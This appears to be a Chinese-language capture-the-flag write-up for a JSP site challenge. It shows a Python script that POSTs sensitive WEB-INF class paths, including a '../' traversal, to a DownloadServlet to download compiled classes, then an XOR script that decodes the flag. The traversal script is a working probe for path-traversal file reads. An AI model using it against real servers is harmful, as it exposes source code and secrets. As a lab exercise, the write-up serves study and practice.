### JSP 网站敏感文件遍历读取

话不多说，直接上题（青少年 CTF 练习平台）

![](https://pic1.imgdb.cn/item/68387fcb58cb8da5c81b1728.png)

打开网页

![](https://pic1.imgdb.cn/item/68387fe758cb8da5c81b17e4.png)

点击提示，用 JSP 写的网站，给的是一个下载接口，需要 POST 请求

![](https://pic1.imgdb.cn/item/68387ff958cb8da5c81b185a.png)

编写脚本遍历一些常见的敏感文件

```python
import requests

def test_download(filename):
    url = "http://challenge.qsnctf.com:31930/DownloadServlet"
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept-Charset': 'UTF-8'
    }
    data = {'filename': filename}
    
    response = requests.post(url, data=data, headers=headers)
    
    print(f"Testing {filename}")
    print(f"Status: {response.status_code}")
    print(f"Content-Type: {response.headers.get('Content-Type', 'Not Set')}")

    # 如果是 class 文件，保存下来
    if response.headers.get('Content-Type') == 'application/octet-stream':
        filename_only = filename.split('/')[-1]
        with open(filename_only, 'wb') as f:
            f.write(response.content)
        print(f"Saved to {filename_only}")
    
    print("-" * 50)

# 测试路径
paths = [
    "WEB-INF/classes/com/ctf/file/DownloadServlet.class",
    "WEB-INF/classes/com/ctf/flag/FlagManager.class",
    "WEB-INF/classes/com/ctf/flag/flag.txt",
    "WEB-INF/classes/flag.txt",
    "WEB-INF/classes/flag",
    "../classes/com/ctf/flag/FlagManager.class"
]

for path in paths:
    test_download(path)
```

反编译下载的 `FlagManager` 文件

![](https://pic1.imgdb.cn/item/6838818f58cb8da5c81b2372.png)

编写脚本解密

```python
key = [110, 107, 185, 183, 183, 186, 103, 185, 99, 105, 105, 187, 105, 99, 102, 184, 185, 103, 99, 108, 186, 107, 187, 99, 183, 109, 105, 184, 102, 106, 106, 188, 109, 186, 111, 188]

flag = []
for k in key:
    c = (k ^ 48) - ord('&')
    flag.append(chr(c))

print(''.join(flag))	# SQCTF{85caad1c-33e3-0bc1-6d5e-a73b044f7d9f}
```

